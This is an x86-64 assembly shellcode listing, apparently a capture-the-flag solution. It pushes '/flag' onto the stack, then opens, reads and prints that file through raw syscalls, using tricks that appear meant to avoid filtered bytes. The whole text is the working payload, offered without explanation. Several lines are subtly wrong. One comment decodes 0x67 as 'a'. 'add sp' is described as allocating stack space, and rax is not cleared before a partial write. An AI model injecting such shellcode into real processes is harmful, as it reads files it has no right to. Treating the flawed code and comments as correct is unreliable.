.intel_syntax noprefix

# create a script given 

.section .text

    mov al, 0x67                  # encoded string: a
    shl rax, 0x20
    or rax, 0x616c662f            # encoded string: /fla
    push rax                      # saving on stack  

    # open /flag 
    mov rdi, rsp                  # address of "/flag"
    xor rsi, rsi                  # rsi (flags) = 0
    xor rdx, rdx                  # rdx (mode) = 0
    xor rax, rax
    mov al, 2                     # ax = 2
    syscall                 

    # reading file /flag
    mov rdi, rax                  # saving fd from open file
    add sp, 0x101                 # allocating space to stack -> 257 byte
    mov rsi, rsp                  # rsi = buffer on stack address
    mov dx, 0x101                 # rdx (count)
    xor rax, rax
    syscall

    # print on stdout
    mov di, 0x1234
    sub di, 0x1233                # di (fd) = 1
    mov rsi, rsp
    mov dx, 0x101
    xor rax, rax
    mov al, 1
    syscall
